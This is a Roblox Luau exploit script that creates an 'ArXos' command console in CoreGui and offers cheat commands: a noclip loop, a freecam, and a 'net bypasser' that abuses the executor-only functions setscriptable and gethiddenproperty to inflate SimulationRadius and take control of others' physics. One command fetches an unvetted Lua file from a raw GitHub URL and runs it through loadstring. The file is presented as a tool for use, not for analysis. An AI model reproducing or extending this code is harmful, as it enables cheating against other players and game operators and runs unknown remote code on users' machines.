local stuffe = Instance.new("ScreenGui")
local JustMain = Instance.new("Frame")
local Command = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local CommandBar = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")
local logs = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local command_logged = Instance.new("TextLabel")
local UIListLayout = Instance.new("UIListLayout")
local exec = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")

--Properties:

stuffe.Name = "stuffe"
stuffe.Parent = game.CoreGui
stuffe.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

JustMain.Name = "JustMain"
JustMain.Parent = stuffe
JustMain.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
JustMain.BorderSizePixel = 0
JustMain.Position = UDim2.new(0.0750390813, 0, 0.216666669, 0)
JustMain.Size = UDim2.new(0, 504, 0, 229)

Command.Name = "/Command"
Command.Parent = JustMain
Command.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Command.BackgroundTransparency = 0.650
Command.Position = UDim2.new(0.0112721277, 0, 0.876068354, 0)
Command.Size = UDim2.new(0, 16, 0, 25)
Command.Font = Enum.Font.SourceSans
Command.Text = "/"
Command.TextColor3 = Color3.fromRGB(255, 151, 32)
Command.TextSize = 14.000
Command.TextStrokeColor3 = Color3.fromRGB(255, 139, 23)

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = Command

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = JustMain

CommandBar.Name = "CommandBar"
CommandBar.Parent = JustMain
CommandBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.BackgroundTransparency = 0.650
CommandBar.Position = UDim2.new(0.0430181585, 0, 0.876068354, 0)
CommandBar.Size = UDim2.new(0, 430, 0, 25)
CommandBar.Font = Enum.Font.SourceSans
CommandBar.PlaceholderText = "use help for more info."
CommandBar.Text = ""
CommandBar.TextColor3 = Color3.fromRGB(255, 255, 255)
CommandBar.TextSize = 14.000
CommandBar.TextXAlignment = Enum.TextXAlignment.Left

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = CommandBar

logs.Name = "logs"
logs.Parent = JustMain
logs.BackgroundColor3 = Color3.fromRGB(255, 151, 32)
logs.BackgroundTransparency = 0.650
logs.Position = UDim2.new(0.0112721277, 0, 0.0311472528, 0)
logs.Size = UDim2.new(0, 493, 0, 189)

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = logs

command_logged.Name = "command_logged"
command_logged.Parent = logs
command_logged.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
command_logged.BackgroundTransparency = 1.000
command_logged.Size = UDim2.new(0, 483, 0, 168)
command_logged.Font = Enum.Font.Code
command_logged.Text = "command_logged"
command_logged.TextColor3 = Color3.fromRGB(255, 255, 255)
command_logged.TextSize = 15.000
command_logged.TextWrapped = true
command_logged.TextXAlignment = Enum.TextXAlignment.Left
command_logged.TextYAlignment = Enum.TextYAlignment.Top

UIListLayout.Parent = logs
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

exec.Name = "exec"
exec.Parent = JustMain
exec.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
exec.BackgroundTransparency = 0.650
exec.Position = UDim2.new(0.909674108, 0, 0.876068354, 0)
exec.Size = UDim2.new(0, 39, 0, 25)
exec.Font = Enum.Font.SourceSans
exec.Text = "EXECUTE"
exec.TextColor3 = Color3.fromRGB(232, 151, 10)
exec.TextScaled = true
exec.TextSize = 14.000
exec.TextWrapped = true

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = exec

---------------------------------------------------------------
local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local userInout = game:GetService("UserInputService")


bind = "q"
command_logged.Text = "Welcome "..plr.Name..". Use the command help to get INFO."


JustMain.Visible = true


exec.MouseButton1Down:connect(function()
	if CommandBar.Text == "help" then
		command_logged.Text = "Welcome to ArXos. ARCU console, Uses axnoil lenguage. \nTo get all the commands type in the console cmds. \nActually we are working for new updates and a continued SCRIPT for our Community. \n\n\nTo get all the information of `axnoil lenguage or scripting lenguage.` please got to the wiki of GitHub"
		
	elseif CommandBar.Text == "exec_print_id" then
		command_logged.Text = "Printing id....."
		wait(2)
		command_logged.Text = "Printed. Press F9"
		local id =  game.PlaceId
		print(id)
	elseif CommandBar.Text == "exec_map_id_exec_admin-cannot_localfalse print_ID" then
		print("OK")
	elseif CommandBar.Text == "exec_map_id_exec_admin-cannot_localfalse print_ID true" then
		print("OK")
		command_logged.Text = "Printed. Press F9"
		
	elseif CommandBar.Text == "exec_axros_scriptFinder" then
		command_logged.Text = "Executed."
		if syn then request = syn.request end
		local req = request({
			Url = 'https://raw.githubusercontent.com/pq786/nsfsg-git/main/lol.lua'
		})
		loadstring(req.Body)()
		
	elseif CommandBar.Text == "update" then
		command_logged.Text = "Last Update was in 4/2/22 at 16:48. \nVersion Name: anquiol \nVersion: 1.1.3"
		
	elseif CommandBar.Text == "mongday-exec" then
		command_logged.Text = "mongday SHILD. Executed."
		
	elseif CommandBar.Text == "arxos_dl.draggable true" then
		command_logged.Text = "Draggable was set to true."	
		JustMain.Draggable = true
	elseif CommandBar.Text == "arxos_dl.draggable false" then
		command_logged.Text = "Draggable was set to false."	
		JustMain.Draggable = false
	elseif CommandBar.Text == "close" then
		command_logged.Text = "Closing....."
		wait(2)
		command_logged.Text = "Bye Bye! "..plr.Name..". We are making our thinks better for you!"
		wait(2)
		JustMain.Visible = false
	elseif CommandBar.Text == "cmds" then
		command_logged.Text = "Welcome to ArXos. ARCU Console Commands, Your commands: \n\n exec_ : Execute a primal script from our lenguage \n negal_ : Execute a new primal SECOND Script from vars. \n unk. : Unk library commands. \n arxos_dl : arxsDl librarys."
		
	elseif CommandBar.Text == "exec - help" then
		command_logged.Text = "Exec Help Function: \n\n Exec works for any game, you can say `exec_dahood_bypass` or more games \n\n Only supported games can be executed by this command."

		
	elseif CommandBar.Text == "exec_test" then
		command_logged.Text = "exec_test Executed. Works correctly."
		
	elseif CommandBar.Text == "exec_noclip.dl" then
		command_logged.Text = "Noclip executed. You can now wh or noclip"
		local noclip = true char = game.Players.LocalPlayer.Character while true do if noclip == true then for _,v in pairs(char:children()) do pcall(function() if v.className == "Part" then v.CanCollide = false elseif v.ClassName == "Model" then v.Head.CanCollide = false end end) end end game:service("RunService").Stepped:wait() end
		
	elseif CommandBar.Text == "exec_freev.cam.nochar" then
		command_logged.Text = "Freecam Executed, press C to toggle it."

			ToggleKey = Enum.KeyCode.C
		SprintKey = Enum.KeyCode.Tab

		localPlayer = game.Players.LocalPlayer

		Camera = game.Workspace.CurrentCamera
		Mouse = localPlayer:GetMouse()

		UserInputService = game:GetService("UserInputService")


		movePosition = Vector2.new(0,0)
		moveDirection = Vector3.new(0,0,0)

		targetMovePosition = movePosition

		Y_Sensitivity = 300;
		X_Sensitivity = 300;

		lastRightButtonDown = Vector2.new(0,0)
		rightMouseButtonDown = false

		targetFOV = 70

		sprinting = false;
		sprintingSpeed = 3;

		keysDown = {}

		moveKeys = {
			[Enum.KeyCode.D] = Vector3.new(1,0,0),
			[Enum.KeyCode.A] = Vector3.new(-1,0,0),
			[Enum.KeyCode.S] = Vector3.new(0,0,1),
			[Enum.KeyCode.W] = Vector3.new(0,0,-1),
			[Enum.KeyCode.E] = Vector3.new(0,1,0),
			[Enum.KeyCode.Q] = Vector3.new(0,-1,0)
		}

		Tween = function(a,b,t)
			if t == 1 then
				return b
			else 
				if tonumber(a) then
					return a * (1-t) + (b*t)
				else
					return a:Lerp(b,t);
				end
			end
		end

		ClampVector3 = function(x,min,max)

			return 
				Vector3.new(
					math.clamp(x.X,min.X,max.X),
					math.clamp(x.Y,min.Y,max.Y),
					math.clamp(x.Z,min.Z,max.Z)
				)

		end


		UserInputService.InputChanged:connect(function(inputObject)
			if inputObject.UserInputType == Enum.UserInputType.MouseMovement then
				movePosition = movePosition + Vector2.new(inputObject.Delta.x,inputObject.Delta.y)
			end
		end)

		CalculateMovement = function()
			local newMovement = Vector3.new(0,0,0)
			for i,v in pairs(keysDown) do
				newMovement = newMovement + (moveKeys[i] or Vector3.new(0,0,0))
			end
			return newMovement
		end

		Round = function(num, numDecimalPlaces)
			return math.floor((num/numDecimalPlaces) + .5)*numDecimalPlaces
		end

		Input = function(input,gameProcessed)
			if moveKeys[input.KeyCode] then
				if input.UserInputState == Enum.UserInputState.Begin then
					keysDown[input.KeyCode] = true
				elseif input.UserInputState == Enum.UserInputState.End then
					keysDown[input.KeyCode] = nil
				end
			else
				if input.UserInputState == Enum.UserInputState.Begin then
					print(input.KeyCode)
					if input.UserInputType == Enum.UserInputType.MouseButton2 then
						rightMouseButtonDown = true
						lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
						UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
					elseif input.KeyCode == Enum.KeyCode.Z then
						targetFOV = 20
					elseif input.KeyCode == SprintKey then
						sprinting = true
					end
				else
					if input.UserInputType == Enum.UserInputType.MouseButton2 then
						rightMouseButtonDown = false
						UserInputService.MouseBehavior = Enum.MouseBehavior.Default
					elseif input.KeyCode == Enum.KeyCode.Z then
						targetFOV = 70
					elseif input.KeyCode == SprintKey then
						sprinting = false
					end
				end
			end
		end

		Mouse.WheelForward:connect(function()
			Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(0,0,-5)
		end)

		Mouse.WheelBackward:connect(function()
			Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(-0,0,5)
		end)

		UserInputService.InputBegan:connect(Input)
		UserInputService.InputEnded:connect(Input)

		local Toggled = false
		game:GetService("UserInputService").InputBegan:connect(function(inputObject)
			if inputObject.KeyCode == ToggleKey then
				Toggled = not Toggled
				if Toggled then
					Camera.CameraType = Enum.CameraType.Scriptable
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
				else
					game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
					game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
					game.Workspace.CurrentCamera.CameraType = "Custom"
				end
			end
		end)


		game:GetService("RunService").RenderStepped:Connect(function()
			if Toggled then
				local mouseTarget = Mouse.Hit

				targetMovePosition = movePosition
				Camera.CoordinateFrame = CFrame.new(Camera.CoordinateFrame.p) * CFrame.fromEulerAnglesYXZ(-targetMovePosition.Y/Y_Sensitivity ,-targetMovePosition.X/X_Sensitivity, 0) * CFrame.new(CalculateMovement() * ((({[true]=sprintingSpeed})[sprinting]) or .5) )
				Camera.FieldOfView = Tween(Camera.FieldOfView,targetFOV,.5)
				if rightMouseButtonDown then
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
					movePosition = movePosition - (lastRightButtonDown - Vector2.new(Mouse.X,Mouse.Y))
					lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
				end
			end
		end)

	
	elseif CommandBar.Text == "unk.execEval" then
			command_logged.Text = "ExecalEval executed"
		
	elseif CommandBar.Text == "negal_net.unk" then
		command_logged.Text = "We are executing the net bypasser. Wait a moment"
		wait(2)
		command_logged.Text = "We are executing the net bypasser. Wait a moment \nExecuted"
		game["Run Service"].RenderStepped:connect(
			function()
				setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
				game.Players.LocalPlayer.SimulationRadius = math.huge * math.huge, math.huge * math.huge * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0 * 1 / 0
			end
		)

		local LocalPlayer = game:GetService("Players").LocalPlayer
		LocalPlayer.SimulationRadiusChanged:Connect(function(radius)
			radius = 9e9
			return radius
		end)
		print(gethiddenproperty(game.Players.LocalPlayer, "SimulationRadius"))
		command_logged.Text = "We are executing the net bypasser. Wait a moment \nExecuted \n\n Check the F9 loaded!"
		
	elseif CommandBar.Text then
		command_logged.Text = "No command found. Please execute help to get info and the commands. \nError: -17"
	end
end)
